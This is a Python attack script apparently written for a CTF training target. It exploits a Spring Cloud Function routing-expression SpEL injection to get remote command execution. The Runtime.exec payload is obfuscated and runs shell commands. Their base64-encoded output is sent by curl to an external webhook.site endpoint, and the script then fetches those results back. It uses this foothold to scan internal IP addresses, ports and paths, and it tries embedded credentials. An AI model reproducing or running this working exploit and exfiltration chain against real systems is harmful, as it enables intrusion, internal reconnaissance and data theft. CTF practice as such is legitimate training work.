#!/usr/bin/env python3
"""
CTF Chile - Buscar endpoints específicos de aplicaciones vault/bancarias
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Buscando endpoints específicos de aplicaciones vault...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=20)
        print(f"    [+] {tag:40} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] FASE 1: Endpoints específicos de vault/banco...")

# Terminología específica de vault y banco
vault_endpoints = [
    "/vault", "/bank", "/accounts", "/balance", "/deposit", "/withdraw",
    "/secure", "/safe", "/treasury", "/ledger", "/transactions", "/money",
    "/omnivault", "/transfer", "/payment", "/credit", "/debit", "/funds"
]

hosts = ["10.160.209.1", "10.109.220.1"]

for host in hosts:
    for endpoint in vault_endpoints:
        host_safe = host.replace(".", "_")
        endpoint_safe = endpoint.replace("/", "_")
        probe(f"vault_{host_safe}{endpoint_safe}", f"curl -s http://{host}:8000{endpoint} 2>/dev/null")

print("[*] FASE 2: Endpoints con parámetros...")

# Probar endpoints con parámetros comunes
param_endpoints = [
    "/account/1", "/user/1", "/vault/1", "/safe/1",
    "/account?id=1", "/user?id=1", "/vault?id=1",
    "/account/admin", "/user/admin", "/account/root"
]

for host in hosts:
    for endpoint in param_endpoints:
        host_safe = host.replace(".", "_")
        endpoint_safe = endpoint.replace("/", "_").replace("?", "_").replace("=", "_")
        probe(f"param_{host_safe}_{endpoint_safe}", f"curl -s http://{host}:8000{endpoint} 2>/dev/null")

print("[*] FASE 3: Endpoints de CTF comunes...")

# Patrones comunes en CTFs
ctf_endpoints = [
    "/flag", "/flags", "/flag1", "/flag2", "/secret", "/hidden",
    "/admin", "/root", "/backdoor", "/debug", "/test", "/dev",
    "/ctf", "/challenge", "/pwn", "/exploit", "/hint"
]

for host in hosts:
    for endpoint in ctf_endpoints:
        host_safe = host.replace(".", "_")
        endpoint_safe = endpoint.replace("/", "_")
        probe(f"ctf_{host_safe}{endpoint_safe}", f"curl -s http://{host}:8000{endpoint} 2>/dev/null")

print("[*] FASE 4: Endpoints con métodos específicos...")

# Probar POST en endpoints que podrían requerir datos
post_endpoints = ["/submit", "/process", "/execute", "/run", "/action"]

for host in hosts:
    for endpoint in post_endpoints:
        host_safe = host.replace(".", "_")
        endpoint_safe = endpoint.replace("/", "_")
        # POST con diferentes tipos de contenido
        probe(f"post_{host_safe}{endpoint_safe}", f"curl -s -X POST -H 'Content-Type: application/json' -d '{{}}' http://{host}:8000{endpoint} 2>/dev/null")

print("[*] FASE 5: Endpoints con credenciales en la URL...")

# Probar credenciales directamente en URLs
creds = [("monitor", "QED"), ("control", "R&D")]

for host in hosts:
    for user, password in creds:
        host_safe = host.replace(".", "_")
        # URLs con credenciales
        probe(f"url_creds_{host_safe}_{user}", f"curl -s http://{user}:{password}@{host}:8000/ 2>/dev/null")
        probe(f"url_creds_openapi_{host_safe}_{user}", f"curl -s http://{user}:{password}@{host}:8000/openapi.json 2>/dev/null")

print("[*] FASE 6: Verificar si hay servicios en otros puertos...")

# Verificar otros puertos en estos hosts
other_ports = [80, 443, 8080, 9000, 3000, 5000]

for host in hosts:
    for port in other_ports:
        host_safe = host.replace(".", "_")
        probe(f"port_{host_safe}_{port}", f"curl -s -I http://{host}:{port}/ 2>/dev/null | head -5")

print("[*] FASE 7: Buscar archivos estáticos comunes...")

# Archivos estáticos que podrían existir
static_files = [
    "/robots.txt", "/sitemap.xml", "/.htaccess", "/favicon.ico",
    "/index.html", "/index.php", "/admin.html", "/config.json",
    "/version.txt", "/readme.txt", "/info.php"
]

for host in hosts:
    for file_path in static_files:
        host_safe = host.replace(".", "_")
        file_safe = file_path.replace("/", "_").replace(".", "_")
        probe(f"static_{host_safe}_{file_safe}", f"curl -s http://{host}:8000{file_path} 2>/dev/null")

time.sleep(30)

# Recoger y analizar respuestas
print("\n[*] Analizando endpoints específicos...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=60", timeout=20)
data = r.json().get("data", [])

valid_endpoints = []
interesting_responses = []
flags_found = []
port_discoveries = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 70)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar respuestas válidas (no 404)
            if not ('{"detail":"Not Found"}' in decoded or "404" in decoded):
                if len(decoded.strip()) > 10:
                    valid_endpoints.append((path, decoded))
                    print("✅ ENDPOINT VÁLIDO ENCONTRADO")

            # Detectar respuestas de otros puertos
            if "port_" in path and any(keyword in decoded.lower() for keyword in ["http/", "server:", "content-type:"]):
                port_discoveries.append((path, decoded))
                print("🔍 SERVICIO EN OTRO PUERTO")

            # Detectar respuestas interesantes
            if any(keyword in decoded.lower() for keyword in ["error", "exception", "forbidden", "unauthorized"]):
                if len(decoded.strip()) > 20 and len(decoded.strip()) < 300:
                    interesting_responses.append((path, decoded))
                    print("⚠️ RESPUESTA INTERESANTE")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*70)
print("📊 RESUMEN DE ENDPOINTS ESPECÍFICOS")
print("="*70)

if valid_endpoints:
    print(f"✅ ENDPOINTS VÁLIDOS: {len(valid_endpoints)}")
    for path, content in valid_endpoints:
        print(f"    🎯 {path}")
        print(f"       {content[:150]}...")

if port_discoveries:
    print(f"\n🔍 SERVICIOS EN OTROS PUERTOS: {len(port_discoveries)}")
    for path, content in port_discoveries:
        print(f"    - {path}: {content[:100]}...")

if interesting_responses:
    print(f"\n⚠️ RESPUESTAS INTERESANTES: {len(interesting_responses)}")
    for path, content in interesting_responses:
        print(f"    - {path}: {content[:100]}...")

if flags_found:
    print(f"\n🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    🎯 {path}: {flag}")
else:
    print("\n💭 No se encontraron flags. Las APIs podrían requerir métodos específicos no probados aún.")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")